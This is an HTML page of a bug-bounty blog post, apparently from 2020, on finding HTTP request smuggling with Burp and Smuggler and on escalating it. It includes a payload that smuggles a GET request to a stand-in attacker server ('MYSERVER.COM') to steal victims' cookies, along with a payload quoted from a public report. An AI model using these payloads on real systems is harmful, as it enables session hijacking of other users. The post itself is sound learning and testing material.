@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Finding and exploiting HTTP Request Smuggling ::
+        zonduu
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Clarification: I’m not an expert in finding and exploiting HTTP Request Smuggling but I will share how I found a couple of them and the steps I make to exploit them.
+How to find them?#Basically there are 2 main ways of finding HTTP Request Smuggling vulnerabilities right now. Using the burp extension or using the @defparam tool (also public) on github called Smuggler.
+Not to mention you can also build your own tool to detect them but I recommend to try those first, and then you can work on your own once you get the hand of it.
+Both tools give you alerts when a possible HTTP Request Smuggling case appears, this means that after you receive one, you need to check if it is a false positive or valid case.
+"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://zonduu.me/posts/http-smug/" />
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="https://zonduu.me/style.css" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://zonduu.me/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://zonduu.me/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Finding and exploiting HTTP Request Smuggling">
+  <meta name="twitter:description" content="How to find HTTP Request Smuggling in the wild">
+
+
+
+<meta property="og:url" content="https://zonduu.me/posts/http-smug/">
+  <meta property="og:site_name" content="zonduu">
+  <meta property="og:title" content="Finding and exploiting HTTP Request Smuggling">
+  <meta property="og:description" content="How to find HTTP Request Smuggling in the wild">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-01-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-01-01T00:00:00+00:00">
+
+
+
+<meta name="google-adsense-account" content="ca-pub-6629477156127628">
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >root@localhost:~#</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+    <span class="header__right">
+      
+      
+
+      
+      <a class="posts-link" href="/posts/">Posts</a>
+      <span class="separator">|</span>
+
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">Finding and exploiting HTTP Request Smuggling</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          2020-01-01
+        </time>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>Clarification: I’m not an expert in finding and exploiting HTTP Request Smuggling but I will share how I found a couple of them and the steps I make to exploit them.</p>
+<h3 id="how-to-find-them">
+  How to find them?
+  <a href="#how-to-find-them" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Basically there are 2 main ways of finding HTTP Request Smuggling vulnerabilities right now. Using the <a href="https://portswigger.net">burp extension</a> or using the @defparam tool (also public) on github called <a href="https://github.com">Smuggler</a>.</p>
+<p>Not to mention you can also build your own tool to detect them but I recommend to try those first, and then you can work on your own once you get the hand of it.<br>
+Both tools give you alerts when a possible HTTP Request Smuggling case appears, this means that after you receive one, you need to check if it is a false positive or valid case.</p>
+<p>This is important to clarify since this specific vulnerability type gives a lot of false annoying positives.</p>
+<h3 id="how-to-exploit-them">
+  How to exploit them?
+  <a href="#how-to-exploit-them" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Ok let’s say that you managed to find a valid case of HTTP Request Smuggling. It is possible to validate it using either the burp extension’s option to check for CLTE/TECL or the <a href="https://github.com">script from @defparam</a> in turbo intruder, now what?</p>
+<p>Well now you need to check if it is an Open Desync or Self Desync… wait what? yes. Apparently you can have a self-desync, meaning that you are only affecting yourself (your connection).</p>
+<p>Basically you need to check if it affects just your IP or if it can affect other IPs/connections (similar to XSS and self-XSS in impact).</p>
+<p>You can make traffic from another ip and see if you can smuggle a request to yourself (if you can’t prove you can affect other connections, report it anyway because it might be possible and you might be missing it).</p>
+<p>After validating it, the first thing I check is if I can redirect to another domain or not, because if you can, then you can usually escalate the issue pretty fast by stealing the victim’s cookies and achieve a critical severity.</p>
+<p>The idea is the following, to smuggle a GET request to your server, for example making the following request:</p>
+<pre tabindex="0"><code>Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+19
+f
+on085=x&amp;bcf5i=x
+0
+
+0
+
+GET https://MYSERVER.COM HTTP/1.1
+X-Ignore: X
+</code></pre><p>But if you can’t, because you get an error or whatever, there are other options like DoS, leveraging the impact of XSS, triggering a harmful request on the victim’s account, and a few more scenarios. A must read is <a href="https://portswigger.net">Albinowax’s guide</a>. It explains everything you need to know and different cases of explotation.</p>
+<p>If you are in a stage environment like I was, and there is 0 traffic going on, you need to generate traffic from other IP. You can use 2 machines, one smuggles the requests and the other one (with other IP) tries to get smuggled.</p>
+<p>I used an online page that takes screenshots of the url you give, which makes keep-alive requests that are possible to smuggle (worked for me at least, ha).</p>
+<p>Ok back to what we were talking. if you aren’t in a stage environment, and you are able to redirect to other domain, then this step isn’t hard at all. You need to point it to burp collaborator or your own personal server and check if you receive a connection from a different IP that you have (best scenario).</p>
+<p>Most of the time this would result in a critical issue since if you redirect to another domain (and isn’t a code 300-399 redirect), then you should be able to steal the cookies, achieving massive Session Takeover, yay!</p>
+<p>A good example of this scenario is shown in this amazing report: <a href="https://hackerone.com/737140">https://hackerone.com/737140</a> where @defparam was able to leak the session cookie, leading to mass session takeover of the users affected.</p>
+<p>The payload tries to smuggle a simple GET request to his server, which will contain all the cookies of the victims :)</p>
+<pre tabindex="0"><code>Host: slackb.com
+User-Agent: Smuggler/v1.0
+Content-Length: 83
+
+0
+
+GET  HTTP/1.1
+X: X
+</code></pre><h3 id="where-to-practice">
+  Where to practice?
+  <a href="#where-to-practice" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>I highly recommend checking the <a href="https://portswigger.net">labs of Portswigger</a>, they have everything you need to know to understand this vulnerability type and get you going.</li>
+<li>Private programs. As stupid as it sounds, private programs are a good place to try and find HTTP Request Smuggling vulnerabilities because they are less tested than public programs. I personally found 3 in 3 different private programs, but 0 in public programs.</li>
+<li>Go for subdomains too! scanning for subs takes more time, but the chances of hitting a subdomain that no-one else scanned for http-smuggling are higher.</li>
+</ul>
+<h3 id="conclusion">
+  Conclusion
+  <a href="#conclusion" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>This is a hard vulnerability type to identify and exploit, it requires time to manually validate it and then look into how to exploit it… take your time!</li>
+<li>The more you research about this, the more things you find.</li>
+<li>This is a pretty “new” vulnerability type (not really, but most of us found out of it in 2019) discovered/researched by Albinowax from Portswigger. There is a lot to dig into.</li>
+</ul>
+<p>Ok that’s all. If you liked the post and want to buy me a coffee, click the icon: <a href="https://www.buymeacoffee.com">www.buymeacoffee.com</a></p>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+   
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+  </body>
+</html>
